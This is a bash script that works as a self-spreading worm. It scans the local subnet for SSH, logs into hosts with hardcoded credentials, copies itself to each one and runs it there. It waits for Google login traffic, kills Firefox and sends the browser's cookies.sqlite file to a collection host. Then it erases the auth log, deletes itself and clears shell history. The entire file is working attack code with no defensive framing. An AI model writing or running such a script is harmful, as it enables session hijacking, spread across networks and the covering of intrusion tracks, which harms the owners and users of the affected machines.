#!/bin/bash

myip=$(ip -4 -o address show enp1s0 | awk '{print $4}' | cut -d '/' -f 1)
mask=$(ip -4 -o address show enp1s0 | awk '{print $4}' | cut -d '/' -f 2)
username="pratham"
password="ubuntu"
home_ip="192.168.122.108"

readarray -t ip_array < <(nmap --open -oG - -p22 "$myip"/"$mask" | awk '!visited[$2]++ && NR > 1 { print $2 }')

if [ ! -f /usr/bin/sshpass ]; then
	echo "$password" | sudo -S apt-get install -y sshpass &> /dev/null
fi

if [ ! -f /usr/bin/nmap ]; then
	echo "$password" | sudo -S apt-get install -y nmap &> /dev/null
fi

for ip in "${ip_array[@]}"; do
	if [[ "$ip" != "$myip" ]]; then
		if ! (sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$ip" "[ -f $0 ]"); then
			sshpass -p "$password" scp -p -o StrictHostKeyChecking=no /home/"$username"/$0 "$username"@"$ip":/home/"$username"/$0
			sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$ip" "/home/"$username"/$0 > /dev/null 2>&1 &"
			sleep 15
		fi
	fi
done

$(echo "$password" | sudo -S tcpdump -c100 -nl host "$myip" and accounts.google.com > /dev/null 2>&1)
notify-send "gotcha"
sleep 60

pkill firefox

sshpass -p "$password" scp -p -o StrictHostKeyChecking=no /home/"$username"/.mozilla/firefox/*default-release/cookies.sqlite "$username"@"$home_ip":/home/"$username"/"$myip"_cookies.sqlite

echo "$password" | sudo bash -c "cat /dev/null > /var/log/auth.log"
rm -- "$0"
history -c
history -w
